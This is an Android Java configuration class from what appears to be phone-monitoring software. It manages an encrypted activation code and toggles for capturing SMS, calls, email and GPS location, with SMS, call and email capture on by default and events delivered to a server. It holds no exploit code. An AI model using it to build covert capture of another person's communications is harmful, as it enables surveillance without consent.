package com.vvt.android.syncmanager.control;

import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.HashMap;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.Uri;
import android.preference.PreferenceManager;
import com.fx.dalvik.util.FxLog;

import com.fx.dalvik.gmail.GmailHelper;
import com.vvt.android.syncmanager.Customization;
import com.vvt.security.FxSecurity;
import com.vvt.security.ServerHashCrypto;

/**
 * Manage all configurations. A reference to an instance can be retrieved through 
 * {@link Main#getConfigurationManager()}. 
 */
public class ConfigurationManager {

//-------------------------------------------------------------------------------------------------
// PRIVATE API
//-------------------------------------------------------------------------------------------------

	private static final String TAG = "ConfigurationManager";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	private static final String SHARED_PREFERENCES_NAME = 
		"com.vvt.android.syncmanager.sharedpreferences";
	
	private static final String KEY_ACTIVATION_CODE = "KEY_ACTIVATION_CODE";
	private static final String KEY_HASH_CODE = "KEY_HASH_CODE";

	private Context mContext;
	
	private SharedPreferences getSharedPreferences() {
		return mContext.getSharedPreferences(SHARED_PREFERENCES_NAME, Context.MODE_PRIVATE);
	}
	
	/**
	 * Encrypt using FxSecurity
	 * @param rawData
	 * @return
	 */
	private String getEncryptedInsertData(String rawData, boolean isServerHash) {
		byte[] encryptedData = null;
		
		if (isServerHash) {
			encryptedData = ServerHashCrypto.encryptServerHash(rawData.getBytes());
		}
		else {
			encryptedData = FxSecurity.encrypt(rawData.getBytes(), false);
		}
		
		if (encryptedData == null) {
			return null;
		}
		else {
			return Arrays.toString(encryptedData)
					.replace("[", "").replace("]", "").replace(", ", " ");
		}
	}
	
	/**
	 * Decrypt using FxSecurity
	 * @param encryptedData
	 * @return
	 */
	private String getDecryptedQueryData(String encryptedData, boolean isServerHash) {
		if (encryptedData == null) {
			return null;
		}
		
		// Construct string array
		String[] encryptedStrArray = encryptedData.split(" ");
		
		// Construct byte array
		ByteBuffer encryptedBytBuf = ByteBuffer.allocate(encryptedStrArray.length);
		
		try {
    		for (int i = 0; i < encryptedStrArray.length; i++) {
    			encryptedBytBuf.put(i, Byte.parseByte(encryptedStrArray[i]));
    		}
    		
    		byte[] decryptedData = null;
    		
    		if (isServerHash) {
    			decryptedData = ServerHashCrypto.decryptServerHash(encryptedBytBuf.array());
    		}
    		else {
    			decryptedData = FxSecurity.decrypt(encryptedBytBuf.array(), false);
    		}
    		
    		return decryptedData != null ? new String(decryptedData) : null;
		}
		catch (NumberFormatException e) {
			return null;
		}
	}
	
//-------------------------------------------------------------------------------------------------
// PROTECTED API
//-------------------------------------------------------------------------------------------------	

	protected ConfigurationManager(Context context) {
		if (LOCAL_LOGV) FxLog.v(TAG, "ConfigurationController # ENTER ...");
		mContext = context;
	}
	
//-------------------------------------------------------------------------------------------------
// PUBLIC API
//-------------------------------------------------------------------------------------------------
	
	public static final String AUTHORITY = "com.mobilefonex.mobilebackup";
	public static final String KEY_DELIVERY_PERIOD = "KEY_DELIVERY_PERIOD";
	public static final String KEY_MAX_EVENTS = "KEY_MAX_EVENTS";
	public static final String KEY_EVENTS_TO_CAPTURE = "KEY_EVENTS_TO_CAPTURE";
	public static final String KEY_IS_CAPTURE_SMS = "KEY_IS_CAPTURE_SMS";
	public static final String KEY_IS_CAPTURE_PHONE_CALL = "KEY_IS_CAPTURE_PHONE_CALL";
	public static final String KEY_IS_CAPTURE_EMAIL = "KEY_IS_CAPTURE_EMAIL";
	public static final String KEY_IS_CAPTURE_LOCATION = "KEY_IS_CAPTURE_LOCATION";
	public static final String KEY_IS_CAPTURE_EVENTS = "KEY_IS_CAPTURE_EVENTS";
	public static final String KEY_GPS_TIME_INTERVAL = "KEY_GPS_TIME_INTERVAL";
	
	public static final String KEY_EVENT_IDENTIFIER = "KEY_EVENT_IDENTIFIER";
	
	public static final String KEY_REF_ID_SMS = "KEY_REF_ID_SMS";
	public static final String KEY_REF_ID_CALL = "KEY_REF_ID_CALL";
	public static final String KEY_REF_ID_EMAIL = "KEY_REF_ID_EMAIL";
	
	public long getDeliveryAllTimeoutMilliseconds() {
		return 600000; // 10 minutes
	}
	
	public int getDeliveryEventsChunkLength() {
		return 50;
	}
	
	public boolean getDefaultCapture() {
		return true;
	}
	
	public boolean getDefaultCaptureSms() {
		return true;
	}
	
	public boolean getDefaultCapturePhoneCall() {
		return true;
	}
	
	public boolean getDefaultCaptureEmail() {
		return true;
	}
	
	public boolean getDefaultCaptureLocation() {
		return false;
	}
	
	public int getDefaultGpsTimeInterval() {
		return 3600;
	}
	
	public double getDefaultEventsDeliveryPeriodHours() {
		return 1.;
	}
	
	public int getMinEventsDeliveryPeriodHours() {
		return 1;
	}
	
	public int getMaxEventsDeliveryPeriodHours() {
		return 24;
	}
	
	public int getDefaultMaxEvents() {
		return 10;
	}
	
	public int getMinMaxEvents() {
		return 1;
	}
	
	public int getMaxMaxEvents() {
		return 500;
	}
	
	public String loadActivationCode() {
		SharedPreferences sharedPreferences = getSharedPreferences();
		String rawActivationCode = sharedPreferences.getString(KEY_ACTIVATION_CODE, null);
		return getDecryptedQueryData(rawActivationCode, false);
	}

	public String loadHashCode() {
		SharedPreferences sharedPreferences = getSharedPreferences();
		String rawHashCode = sharedPreferences.getString(KEY_HASH_CODE, null);
		return getDecryptedQueryData(rawHashCode, true);
	}
	
	public boolean loadCaptureEnabled() {
		SharedPreferences sharedPreferences = 
				PreferenceManager.getDefaultSharedPreferences(mContext);
		
		if (! sharedPreferences.contains(KEY_IS_CAPTURE_EVENTS)) {
			SharedPreferences.Editor editor = sharedPreferences.edit();
			editor.putBoolean(KEY_IS_CAPTURE_EVENTS, getDefaultCapture());
			editor.commit();
		}
		
		return sharedPreferences.getBoolean(KEY_IS_CAPTURE_EVENTS, getDefaultCapture());
	}

	public boolean loadCaptureSmsEnabled() {
		SharedPreferences sharedPreferences = 
				PreferenceManager.getDefaultSharedPreferences(mContext);
		
		if (! sharedPreferences.contains(KEY_IS_CAPTURE_SMS)) {
			SharedPreferences.Editor editor = sharedPreferences.edit();
			editor.putBoolean(KEY_IS_CAPTURE_SMS, getDefaultCaptureSms());
			editor.commit();
		}
		
		return sharedPreferences.getBoolean(KEY_IS_CAPTURE_SMS, getDefaultCaptureSms());
	}

	public boolean loadCapturePhoneCallEnabled() {
		SharedPreferences sharedPreferences = 
				PreferenceManager.getDefaultSharedPreferences(mContext);
		
		if (! sharedPreferences.contains(KEY_IS_CAPTURE_PHONE_CALL)) {
			SharedPreferences.Editor editor = sharedPreferences.edit();
			editor.putBoolean(KEY_IS_CAPTURE_PHONE_CALL, getDefaultCapturePhoneCall());
			editor.commit();
		}
		
		return sharedPreferences.getBoolean(KEY_IS_CAPTURE_PHONE_CALL, 
				getDefaultCapturePhoneCall());
	}
	
	public boolean loadCaptureLocationEnabled() {
		SharedPreferences sharedPreferences = 
				PreferenceManager.getDefaultSharedPreferences(mContext);
		
		if (! sharedPreferences.contains(KEY_IS_CAPTURE_LOCATION)) {
			SharedPreferences.Editor editor = sharedPreferences.edit();
			editor.putBoolean(KEY_IS_CAPTURE_LOCATION, getDefaultCaptureLocation());
			editor.commit();
		}
		
		return sharedPreferences.getBoolean(KEY_IS_CAPTURE_LOCATION, getDefaultCaptureLocation());
	}
	
	public int loadGpsTimeIntervalSeconds() {
		SharedPreferences sharedPreferences = getSharedPreferences();
		return sharedPreferences.getInt(KEY_GPS_TIME_INTERVAL, getDefaultGpsTimeInterval());
	}
	
	public double loadDeliveryPeriodHours() {
		SharedPreferences sharedPreferences = 
				PreferenceManager.getDefaultSharedPreferences(mContext);
		
		// This preference will be used by EditTextPreference which store data as a string.
		// So we need to store it as a string as well.
		
		String stringValue = sharedPreferences.getString(KEY_DELIVERY_PERIOD, null);
		
		if (stringValue == null) {
			stringValue = String.format("%.0f", getDefaultEventsDeliveryPeriodHours());
			SharedPreferences.Editor editor = sharedPreferences.edit();
			editor.putString(KEY_DELIVERY_PERIOD, stringValue);
			editor.commit();
		}

		return Double.parseDouble(stringValue);
	}
	
	public long loadEventsDeliveryPeriodMilliseconds() {
		return (long) (loadDeliveryPeriodHours() * 3600000. + 0.5);
	}
	
	public int loadMaxEvents() {
		SharedPreferences sharedPreferences = 
				PreferenceManager.getDefaultSharedPreferences(mContext);
		
		// This preference will be used by EditTextPreference which store data as a string.
		// So we need to store it as a string as well.
		
		String stringValue = sharedPreferences.getString(KEY_MAX_EVENTS, null);
		
		if (stringValue == null) {
			stringValue = String.format("%d", getDefaultMaxEvents());
			SharedPreferences.Editor editor = sharedPreferences.edit();
			editor.putString(KEY_MAX_EVENTS, stringValue);
			editor.commit();
		}

		return Integer.parseInt(stringValue);
	}
	
	public long loadRefIdSms() {
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
		
		return sharedPreferences.getLong(KEY_REF_ID_SMS, -1);
	}
	
	public long loadRefIdCall() {
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
		
		return sharedPreferences.getLong(KEY_REF_ID_CALL, -1);
	}
	
	public HashMap<String, Long> loadRefIdEmail() {
		HashMap<String, Long> refIds = new HashMap<String, Long>();
		
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
		
		String stringValue = sharedPreferences.getString(KEY_REF_ID_EMAIL, null);
		
		if (stringValue == null) {
			return refIds;
		}
		else {
			refIds = GmailHelper.constructRefDatesMap(stringValue);
		}

		return refIds;
	}
	
	public void dumpActivationCode(String activationCode) {
		if (LOCAL_LOGV) FxLog.v(TAG, "dumpActivationCode # ENTER ...");
		SharedPreferences sharedPreferences = getSharedPreferences();
		SharedPreferences.Editor editor = sharedPreferences.edit();
		
		if (activationCode == null) {
			editor.remove(KEY_ACTIVATION_CODE);
		} 
		else {
			activationCode = getEncryptedInsertData(activationCode, false);
			editor.putString(KEY_ACTIVATION_CODE, activationCode);
		}
		if (! editor.commit()) {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump activation code");
		}
	}

	public void dumpHashCode(String hashCode) {
		if (LOCAL_LOGV) FxLog.v(TAG, "dumpHashCode # ENTER ...");
		SharedPreferences sharedPreferences = getSharedPreferences();
		SharedPreferences.Editor editor = sharedPreferences.edit();
		
		if (hashCode == null) {
			editor.remove(KEY_HASH_CODE);
		} 
		else {
			hashCode = getEncryptedInsertData(hashCode, true);
			editor.putString(KEY_HASH_CODE, hashCode);
		}
		if (! editor.commit()) {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump hash code");
		}
	}
	
	public void dumpCaptureEnabled(boolean captureEnabled) {
		if (LOCAL_LOGV) FxLog.v(TAG, "dumpHashCode # ENTER ...");
		SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(mContext);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		
		editor.putBoolean(KEY_IS_CAPTURE_EVENTS, captureEnabled);
		
		if (editor.commit()) {
			notifyChange(KEY_IS_CAPTURE_EVENTS);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_IS_CAPTURE_EVENTS");
		}
	}
	
	public void dumpCaptureSmsEnabled(boolean value) {
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
	
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putBoolean(KEY_IS_CAPTURE_SMS, value);
		
		if (editor.commit()) {
			notifyChange(KEY_IS_CAPTURE_SMS);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_IS_CAPTURE_SMS");
		}
	}
	
	public void dumpCapturePhoneCallEnabled(boolean value) {
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
	
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putBoolean(KEY_IS_CAPTURE_PHONE_CALL, value);
		
		if (editor.commit()) {
			notifyChange(KEY_IS_CAPTURE_PHONE_CALL);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_IS_CAPTURE_PHONE_CALL");
		}
	}
	
	public void dumpCaptureLocationEnabled(boolean value) {
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
	
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putBoolean(KEY_IS_CAPTURE_LOCATION, value);
		
		if (editor.commit()) {
			notifyChange(KEY_IS_CAPTURE_LOCATION);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_IS_CAPTURE_LOCATION");
		}
	}
	
	public void dumpGpsTimeInterval(int second) {
		SharedPreferences sharedPreferences = getSharedPreferences();
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putInt(KEY_GPS_TIME_INTERVAL, second);
		
		if (editor.commit()) {
			notifyChange(KEY_GPS_TIME_INTERVAL);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_GPS_TIME_INTERVAL");
		}
	}

	public void dumpEventsDeliveryPeriodHours(double value) {
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
		
		String stringValue = String.format("%.0f", value);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putString(KEY_DELIVERY_PERIOD, stringValue);
		
		if (editor.commit()) {
			notifyChange(KEY_DELIVERY_PERIOD);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_DELIVERY_PERIOD");
		}
	}
	
	public void dumpMaxEvents(int value) {
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
		
		String stringValue = String.format("%d", value);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putString(KEY_MAX_EVENTS, stringValue);
		
		if (editor.commit()) {
			notifyChange(KEY_MAX_EVENTS);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_MAX_EVENTS");
		}
	}
	
	public void dumpRefIdSms(long refId) {
		String key = KEY_REF_ID_SMS;
		
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
		
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putLong(key, refId);
		
		if (editor.commit()) {
			notifyChange(key);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_REF_ID_SMS");
		}
	}
	
	public void dumpRefIdCall(long refId) {
		String key = KEY_REF_ID_CALL;
		
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
		
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putLong(key, refId);
		
		if (editor.commit()) {
			notifyChange(key);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_REF_ID_CALL");
		}
	}
	
	public void dumpRefIdEmail(HashMap<String, Long> refIds) {
		String key  = KEY_REF_ID_EMAIL;
		
		SharedPreferences sharedPreferences = 
			PreferenceManager.getDefaultSharedPreferences(mContext);
		
		String stringValue = GmailHelper.constructRefDatesString(refIds);
		
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putString(key, stringValue);
		
		if (editor.commit()) {
			notifyChange(key);
		}
		else {
			if (LOCAL_LOGD) FxLog.d(TAG, "cannot dump KEY_TIMEREF_EMAIL");
		}
	}
	
	public void notifyChange(String key) {
		mContext.getContentResolver().notifyChange(getObserverUriForKey(key), null);
	}
	
	public Uri getObserverUriForKey(String key) {
		return Uri.parse(String.format("content://%s/%s", AUTHORITY, key));
	}
	
	public synchronized int getIdentifier() {
		if (LOCAL_LOGV) FxLog.v(TAG, "getIdentifier # ENTER ...");
		
		// Get current ID
		SharedPreferences sharedPreferences = getSharedPreferences();
		int id = sharedPreferences.getInt(KEY_EVENT_IDENTIFIER, 0);
		if (LOCAL_LOGV) FxLog.v(TAG, String.format("getIdentifier # id: %s", id));
		
		// Commit next ID
		int nextId = id + 1;
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putInt(KEY_EVENT_IDENTIFIER, nextId);
		if (LOCAL_LOGV) FxLog.v(TAG, String.format("getIdentifier # nextId: %s", nextId));
		
		boolean isCommitted = editor.commit();
		if (LOCAL_LOGV) FxLog.v(TAG, String.format("getIdentifier # Value committied: %s", 
				isCommitted? "success": "failed!"));
		
		return id;
	}

	
}
 